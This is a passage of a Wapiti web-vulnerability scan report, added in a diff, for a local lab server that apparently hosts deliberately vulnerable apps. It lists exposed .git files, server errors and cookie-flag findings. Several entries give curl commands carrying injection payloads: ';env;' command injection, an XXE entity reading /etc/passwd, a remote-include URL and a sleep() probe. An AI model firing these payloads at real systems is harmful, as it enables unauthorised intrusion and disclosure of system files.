+http://osvdb.org/show/osvdb/3233</pre>
+                        </div>
+                        <div id="tab-vuln-9-4-2" style="min-height: 124px;">
+                            <pre>GET /icons/README HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-4-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/icons/README&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /.git/index</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-5-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-5-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-5-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-5-1" style="min-height: 124px;">
+                            <pre>Git Index file may contain directory listing information.
+References:
+http://osvdb.org/show/osvdb/3092</pre>
+                        </div>
+                        <div id="tab-vuln-9-5-2" style="min-height: 124px;">
+                            <pre>GET /.git/index HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-5-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/.git/index&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /webservices/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-6-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-6-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-6-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-6-1" style="min-height: 124px;">
+                            <pre>Webservices found</pre>
+                        </div>
+                        <div id="tab-vuln-9-6-2" style="min-height: 124px;">
+                            <pre>GET /webservices/ HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-6-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/webservices/&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /.git/config</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-7-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-7-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-7-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-7-1" style="min-height: 124px;">
+                            <pre>Git config file found. Infos about repo details may be present.</pre>
+                        </div>
+                        <div id="tab-vuln-9-7-2" style="min-height: 124px;">
+                            <pre>GET /.git/config HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-7-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/.git/config&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /server-status</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-8-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-8-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-8-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-8-1" style="min-height: 124px;">
+                            <pre>Apache server-status interface found (protected/forbidden)</pre>
+                        </div>
+                        <div id="tab-vuln-9-8-2" style="min-height: 124px;">
+                            <pre>GET /server-status HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-8-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/server-status&#34;</pre>
+                        </div>
+
+                <dl><dt>Solutions</dt><dd>Make sure the script is up-to-date and restrict access to it if possible</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="http://osvdb.org/">The Open Source Vulnerability Database</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="anom_type_0">Internal Server Error</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Internal server error description</dd>
+                </dl>
+
+                        <h4>Anomaly found in /includes/pop-up-help-context-generator.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-0-1">Description</a></li>
+                                <li><a href="#tab-anom-0-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-0-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter pagename</pre>
+                        </div>
+                        <div id="tab-anom-0-0-2" style="min-height: 124px;">
+                            <pre>GET /includes/pop-up-help-context-generator.php?pagename=%3Benv%3B HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/pop-up-help-context-generator.php?pagename=%3Benv%3B&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /webservices/soap/ws-user-account.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-1-1">Description</a></li>
+                                <li><a href="#tab-anom-0-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-1-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter wsdl</pre>
+                        </div>
+                        <div id="tab-anom-0-1-2" style="min-height: 124px;">
+                            <pre>GET /webservices/soap/ws-user-account.php?wsdl=%3Benv%3B HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/webservices/soap/ws-user-account.php?wsdl=%3Benv%3B&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /includes/pop-up-help-context-generator.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-2-1">Description</a></li>
+                                <li><a href="#tab-anom-0-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-2-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter pagename</pre>
+                        </div>
+                        <div id="tab-anom-0-2-2" style="min-height: 124px;">
+                            <pre>GET /includes/pop-up-help-context-generator.php?pagename=https%3A%2F%2Fwapiti3.ovh%2Fe.php HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/pop-up-help-context-generator.php?pagename=https%3A%2F%2Fwapiti3.ovh%2Fe.php&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /includes/pop-up-help-context-generator.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-3-1">Description</a></li>
+                                <li><a href="#tab-anom-0-3-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-3-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-3-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter pagename</pre>
+                        </div>
+                        <div id="tab-anom-0-3-2" style="min-height: 124px;">
+                            <pre>GET /includes/pop-up-help-context-generator.php?pagename=%C2%BF%27%22%28 HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-3-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/pop-up-help-context-generator.php?pagename=%C2%BF%27%22%28&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /webservices/soap/ws-user-account.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-4-1">Description</a></li>
+                                <li><a href="#tab-anom-0-4-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-4-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-4-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter wsdl</pre>
+                        </div>
+                        <div id="tab-anom-0-4-2" style="min-height: 124px;">
+                            <pre>GET /webservices/soap/ws-user-account.php?wsdl=%C2%BF%27%22%28 HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-4-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/webservices/soap/ws-user-account.php?wsdl=%C2%BF%27%22%28&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /includes/pop-up-help-context-generator.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-5-1">Description</a></li>
+                                <li><a href="#tab-anom-0-5-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-5-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-5-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter pagename</pre>
+                        </div>
+                        <div id="tab-anom-0-5-2" style="min-height: 124px;">
+                            <pre>GET /includes/pop-up-help-context-generator.php?pagename=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-5-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/pop-up-help-context-generator.php?pagename=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /webservices/soap/ws-user-account.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-6-1">Description</a></li>
+                                <li><a href="#tab-anom-0-6-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-6-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-6-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter wsdl</pre>
+                        </div>
+                        <div id="tab-anom-0-6-2" style="min-height: 124px;">
+                            <pre>GET /webservices/soap/ws-user-account.php?wsdl=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-6-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/webservices/soap/ws-user-account.php?wsdl=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /includes/pop-up-help-context-generator.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-7-1">Description</a></li>
+                                <li><a href="#tab-anom-0-7-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-7-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-7-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter pagename</pre>
+                        </div>
+                        <div id="tab-anom-0-7-2" style="min-height: 124px;">
+                            <pre>GET /includes/pop-up-help-context-generator.php?pagename=sleep%287%29%231 HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-7-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/pop-up-help-context-generator.php?pagename=sleep%287%29%231&#34;</pre>
+                        </div>
+                        <h4>Anomaly found in /webservices/soap/ws-user-account.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-0-8-1">Description</a></li>
+                                <li><a href="#tab-anom-0-8-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-0-8-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-0-8-1" style="min-height: 124px;">
+                            <pre>The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter wsdl</pre>
+                        </div>
+                        <div id="tab-anom-0-8-2" style="min-height: 124px;">
+                            <pre>GET /webservices/soap/ws-user-account.php?wsdl=sleep%287%29%231 HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-0-8-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/webservices/soap/ws-user-account.php?wsdl=sleep%287%29%231&#34;</pre>
+                        </div>
+
+                <dl><dt>Solutions</dt><dd>More information about the error should be found in the server logs.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#5xx_Server_Error">Wikipedia article for 5xx HTTP error codes</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="anom_type_1">Resource consumption</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Resource consumption description</dd>
+                </dl>
+
+                        <h4>Anomaly found in /phpmyadmin/setup/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-anom-1-0-1">Description</a></li>
+                                <li><a href="#tab-anom-1-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-anom-1-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-anom-1-0-1" style="min-height: 124px;">
+                            <pre>The request timed out while attempting to inject a payload in the parameter version_check</pre>
+                        </div>
+                        <div id="tab-anom-1-0-2" style="min-height: 124px;">
+                            <pre>GET /phpmyadmin/setup/?version_check=https%3A%2F%2Fwapiti3.ovh%2Fe.php&amp;token=ebaa70372723e877f2f17932ef6cea58 HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-anom-1-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/setup/?version_check=https%3A%2F%2Fwapiti3.ovh%2Fe.php&amp;token=ebaa70372723e877f2f17932ef6cea58&#34;</pre>
+                        </div>
+
+                <dl><dt>Solutions</dt><dd>The involved script is maybe using the server resources (CPU, memory, network, file access...) in a non-efficient way</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)">http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)</a></li>
+                    <li><a href="http://cwe.mitre.org/data/definitions/400.html">CWE-400: Uncontrolled Resource Consumption (&#39;Resource Exhaustion&#39;)</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="addition_type_0">Fingerprint web technology</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Fingerprint web technology description</dd>
+                </dl>
+
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-0-0-1">Description</a></li>
+                                <li><a href="#tab-addition-0-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-0-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-0-0-1" style="min-height: 124px;">
+                            <pre>Apache 2.4.7</pre>
+                        </div>
+                        <div id="tab-addition-0-0-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-0-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-0-1-1">Description</a></li>
+                                <li><a href="#tab-addition-0-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-0-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-0-1-1" style="min-height: 124px;">
+                            <pre>PHP</pre>
+                        </div>
+                        <div id="tab-addition-0-1-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-0-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-0-2-1">Description</a></li>
+                                <li><a href="#tab-addition-0-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-0-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-0-2-1" style="min-height: 124px;">
+                            <pre>Ubuntu</pre>
+                        </div>
+                        <div id="tab-addition-0-2-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-0-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                <dl><dt>Solutions</dt><dd>This is only for informational purposes.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html">WSTG-INFO-02: Fingerprint Web Server</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html">WSTG-INFO-08: Fingerprint Web Application Framework</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application.html">WSTG-INFO-09: Fingerprint Web Application</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="addition_type_3">HttpOnly Flag cookie</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>HttpOnly Flag cookie description</dd>
+                </dl>
+
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-3-0-1">Description</a></li>
+                                <li><a href="#tab-addition-3-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-3-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-3-0-1" style="min-height: 124px;">
+                            <pre>HttpOnly flag is not set in the cookie : PHPSESSID</pre>
+                        </div>
+                        <div id="tab-addition-3-0-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-3-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-3-1-1">Description</a></li>
+                                <li><a href="#tab-addition-3-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-3-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-3-1-1" style="min-height: 124px;">
+                            <pre>HttpOnly flag is not set in the cookie : showhints</pre>
+                        </div>
+                        <div id="tab-addition-3-1-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-3-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-3-2-1">Description</a></li>
+                                <li><a href="#tab-addition-3-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-3-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-3-2-1" style="min-height: 124px;">
+                            <pre>HttpOnly flag is not set in the cookie : pma_collation_connection</pre>
+                        </div>
+                        <div id="tab-addition-3-2-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-3-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-3-3-1">Description</a></li>
+                                <li><a href="#tab-addition-3-3-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-3-3-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-3-3-1" style="min-height: 124px;">
+                            <pre>HttpOnly flag is not set in the cookie : pma_lang</pre>
+                        </div>
+                        <div id="tab-addition-3-3-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-3-3-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                <dl><dt>Solutions</dt><dd>HttpOnly Flag cookie Solution</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html">WSTG-INFO-02: Testing for Cookies Attributes</a></li>
+                    <li><a href="https://owasp.org/www-community/HttpOnly">WSTG-INFO-08: HttpOnly Flag</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="addition_type_4">Secure Flag cookie</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Secure Flag cookie description</dd>
+                </dl>
+
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-0-1">Description</a></li>
+                                <li><a href="#tab-addition-4-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-0-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : PHPSESSID</pre>
+                        </div>
+                        <div id="tab-addition-4-0-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-1-1">Description</a></li>
+                                <li><a href="#tab-addition-4-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-1-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : _railsgoat_session</pre>
+                        </div>
+                        <div id="tab-addition-4-1-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-2-1">Description</a></li>
+                                <li><a href="#tab-addition-4-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-2-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : showhints</pre>
+                        </div>
+                        <div id="tab-addition-4-2-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-3-1">Description</a></li>
+                                <li><a href="#tab-addition-4-3-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-3-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-3-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : phpMyAdmin</pre>
+                        </div>
+                        <div id="tab-addition-4-3-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-3-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-4-1">Description</a></li>
+                                <li><a href="#tab-addition-4-4-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-4-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-4-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : pma_collation_connection</pre>
+                        </div>
+                        <div id="tab-addition-4-4-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-4-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                        <h4>Additional found in /</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true">
+                            <ul>
+                                <li class="active"><a href="#tab-addition-4-5-1">Description</a></li>
+                                <li><a href="#tab-addition-4-5-2">HTTP Request</a></li>
+                                <li><a href="#tab-addition-4-5-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-addition-4-5-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : pma_lang</pre>
+                        </div>
+                        <div id="tab-addition-4-5-2" style="min-height: 124px;">
+                            <pre>GET / HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-addition-4-5-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/&#34;</pre>
+                        </div>
+                <dl><dt>Solutions</dt><dd>Secure Flag cookie Solution</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html">WSTG-INFO-02: Testing for Cookies Attributes</a></li>
+                    <li><a href="https://owasp.org/www-community/controls/SecureFlag">WSTG-INFO-09: SecureFlag</a></li>
+                </ul>
+                <br />
+                <hr>
+        </div>
+        <footer class="small" id="footer"><a href="https://wapiti.sourceforge.io/" id="wapiti_link">Wapiti 3.0.3</a> &copy; Nicolas SURRIBAS 2006-2020</footer>
+	</div>
+    <script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
+    <script type="text/javascript" src="js/kube.min.js"></script>
+</body>
+</html>
